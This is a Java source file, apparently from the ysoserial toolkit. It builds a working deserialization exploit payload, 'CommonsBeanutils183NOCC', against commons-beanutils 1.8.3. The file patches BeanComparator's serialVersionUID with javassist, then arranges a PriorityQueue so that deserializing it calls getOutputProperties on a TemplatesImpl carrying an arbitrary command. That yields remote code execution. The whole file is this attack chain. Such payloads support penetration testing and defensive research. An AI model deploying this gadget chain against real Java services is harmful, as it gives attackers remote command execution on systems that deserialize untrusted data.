package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.io.FileOutputStream;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({Authors.Y4ER})
public class CommonsBeanutils183NOCC implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils183NOCC.class, args);
    }

    @Override
    public Object getObject(String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
        CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
        ctClass.addField(field);
        Class beanCompareClazz = ctClass.toClass();
        BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        return queue;
    }
}
